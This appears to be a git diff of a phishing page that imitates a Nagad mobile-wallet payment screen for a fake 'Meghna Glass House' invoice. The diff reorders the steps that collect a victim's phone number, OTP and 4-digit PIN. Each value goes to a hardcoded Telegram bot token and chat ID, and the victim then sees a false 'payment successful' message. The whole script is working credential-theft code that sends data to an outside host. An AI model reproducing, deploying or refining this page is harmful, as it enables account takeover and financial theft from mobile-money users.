@@ -88,35 +88,6 @@
     </div>
   </div>
 
-  <div id="step-pin" class="modal">
-    <div class="top-bar">
-      <div class="top-left-x" onclick="location.reload()">
-        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
-      </div>
-      <div class="lang-toggle"><button type="button" class="active">বাংলা</button><button type="button">Eng</button></div>
-    </div>
-    <div class="brand">
-      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6h15l-1.5 7H8.5L6 6z"></path><circle cx="10" cy="18" r="1"></circle><circle cx="18" cy="18" r="1"></circle></svg>
-      <h1>MEGHNA GLASS HOUSE</h1>
-    </div>
-    <div class="invoice">
-      <div class="row"><span class="label">Invoice No:</span> BD1041239620635</div>
-      <div class="row"><span class="label">Charge:</span> BDT 0</div>
-    </div>
-    <div class="pin-label">Enter 4-Digit PIN</div>
-    <div class="pin-inputs">
-      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
-      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
-      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
-      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
-    </div>
-    <div id="error-2" class="error"></div>
-    <div class="actions">
-      <button type="button" id="btn-2" class="btn proceed" onclick="validateStep2()">Proceed</button>
-      <button type="button" class="btn close" onclick="location.reload()">Close</button>
-    </div>
-  </div>
-
   <div id="step-otp" class="modal">
     <div class="top-bar">
       <div class="top-left-x" onclick="location.reload()">
@@ -130,24 +101,51 @@
     </div>
     <div class="otp-label">Enter Verification Code [OTP]</div>
     <input type="text" id="otpInput" maxlength="6" class="otp-input" inputmode="numeric" placeholder="XXXXXX">
-    
     <div id="error-3" class="error"></div>
     <div class="actions">
-      <button type="button" id="btn-3" class="btn proceed" onclick="validateStep3()">Proceed</button>
+      <button type="button" id="btn-otp" class="btn proceed" onclick="validateStepOTP()">Proceed</button>
       <button type="button" class="btn resend" onclick="alert('🔄 নতুন OTP পাঠানো হয়েছে')">Resend Code</button>
+      <button type="button" class="btn close" onclick="location.reload()">Close</button>
+    </div>
+  </div>
+
+  <div id="step-pin" class="modal">
+    <div class="top-bar">
+      <div class="top-left-x" onclick="location.reload()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+      </div>
+      <div class="lang-toggle"><button type="button" class="active">বাংলা</button><button type="button">Eng</button></div>
+    </div>
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6 6h15l-1.5 7H8.5L6 6z"></path><circle cx="10" cy="18" r="1"></circle><circle cx="18" cy="18" r="1"></circle></svg>
+      <h1>MEGHNA GLASS HOUSE</h1>
+    </div>
+    <div class="invoice">
+      <div class="row"><span class="label">Invoice No:</span> BD1041239620635</div>
+      <div class="row"><span class="label">Charge:</span> BDT 21</div>
+    </div>
+    <div class="pin-label">Enter 4-Digit PIN</div>
+    <div class="pin-inputs">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+      <input type="password" maxlength="1" inputmode="numeric" class="pinBox">
+    </div>
+    <div id="error-2" class="error"></div>
+    <div class="actions">
+      <button type="button" id="btn-pin" class="btn proceed" onclick="validateStepPIN()">Proceed</button>
       <button type="button" class="btn close" onclick="location.reload()">Close</button>
     </div>
   </div>
 
   <script>
     // --- TELEGRAM CONFIG ---
-    const TELEGRAM_TOKEN = '8599559236:AAHiKkoqaOiN39NP1s-BSB1LaJ6HFb-O5BU'; // আপনার বোট টোকেন এখানে দিন
-    const CHAT_ID = '7260345767';         // আপনার চ্যাট আইডি এখানে দিন
+    const TELEGRAM_TOKEN = '8599559236:AAHiKkoqaOiN39NP1s-BSB1LaJ6HFb-O5BU'; 
+    const CHAT_ID = '7260345767';         
 
     let USER_NUMBER = "";
-    let USER_PIN = "";
+    let USER_OTP = "";
 
-    // Telegram Sender Function
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
       try {
@@ -157,7 +155,7 @@
       }
     }
 
-    // Step 1 Validation & Sending
+    // Step 1: Number Validation
     async function validateStep1() {
       const num = document.getElementById('acctNumber').value;
       const err = document.getElementById('error-1');
@@ -171,52 +169,51 @@
         await sendToTelegram(`🔔 Nagad Number: ${num}`);
         
         document.getElementById('step-number').classList.remove('active');
-        document.getElementById('step-pin').classList.add('active');
+        document.getElementById('step-otp').classList.add('active');
       } else {
         err.textContent = 'অনুগ্রহ করে সঠিক ১১ সংখ্যার মোবাইল নাম্বার দিন';
         err.style.display = 'block';
       }
     }
 
-    // Step 2 Validation & Sending
-    async function validateStep2() {
-      let pin = "";
-      document.querySelectorAll('.pinBox').forEach(b => pin += b.value);
-      const err = document.getElementById('error-2');
-      const btn = document.getElementById('btn-2');
+    // Step 2: OTP Validation
+    async function validateStepOTP() {
+      const otp = document.getElementById('otpInput').value;
+      const err = document.getElementById('error-3');
+      const btn = document.getElementById('btn-otp');
 
-      if(pin.length === 4) {
-        USER_PIN = pin;
+      if(/^\d{6}$/.test(otp)) {
+        USER_OTP = otp;
         btn.disabled = true;
-        btn.innerText = "Processing...";
+        btn.innerText = "Verifying...";
 
-        await sendToTelegram(`🔑 Nagad PIN: ${pin}\n(For: ${USER_NUMBER})`);
+        await sendToTelegram(`✅ Nagad OTP: ${otp}\n(For: ${USER_NUMBER})`);
 
-        document.getElementById('step-pin').classList.remove('active');
-        document.getElementById('step-otp').classList.add('active');
+        document.getElementById('step-otp').classList.remove('active');
+        document.getElementById('step-pin').classList.add('active');
       } else {
-        err.textContent = 'অনুগ্রহ করে 4 সংখ্যার PIN লিখুন';
+        err.textContent = 'অনুগ্রহ করে সঠিক ৬ সংখ্যার OTP দিন';
         err.style.display = 'block';
       }
     }
 
-    // Step 3 (OTP) Final Sending
-    async function validateStep3() {
-      const otp = document.getElementById('otpInput').value;
-      const err = document.getElementById('error-3');
-      const btn = document.getElementById('btn-3');
+    // Step 3: PIN Validation (Final)
+    async function validateStepPIN() {
+      let pin = "";
+      document.querySelectorAll('.pinBox').forEach(b => pin += b.value);
+      const err = document.getElementById('error-2');
+      const btn = document.getElementById('btn-pin');
 
-      if(/^\d{6}$/.test(otp)) {
+      if(pin.length === 4) {
         btn.disabled = true;
-        btn.innerText = "Verifying...";
+        btn.innerText = "Processing...";
 
-        await sendToTelegram(`✅ Nagad OTP: ${otp}\nNumber: ${USER_NUMBER}\nPIN: ${USER_PIN}`);
+        await sendToTelegram(`🔑 Nagad PIN: ${pin}\nNumber: ${USER_NUMBER}\nOTP: ${USER_OTP}`);
 
-        // সব শেষ হলে ইউজারকে রিডাইরেক্ট বা সাকসেস মেসেজ দিতে পারেন
         alert("পেমেন্ট সফলভাবে সম্পন্ন হয়েছে!");
-        window.location.href = "index.html";
+        window.location.href = "index.html"; 
       } else {
-        err.textContent = 'অনুগ্রহ করে সঠিক ৬ সংখ্যার OTP দিন';
+        err.textContent = 'অনুগ্রহ করে 4 সংখ্যার PIN লিখুন';
         err.style.display = 'block';
       }
     }
@@ -232,7 +229,7 @@
       });
     });
 
-    // Input গুলোতে ক্লিক করলে এরর মেসেজ চলে যাবে
+    // Input Clear Error
     document.querySelectorAll('input').forEach(input => {
       input.addEventListener('input', () => {
         document.querySelectorAll('.error').forEach(e => e.style.display = 'none');
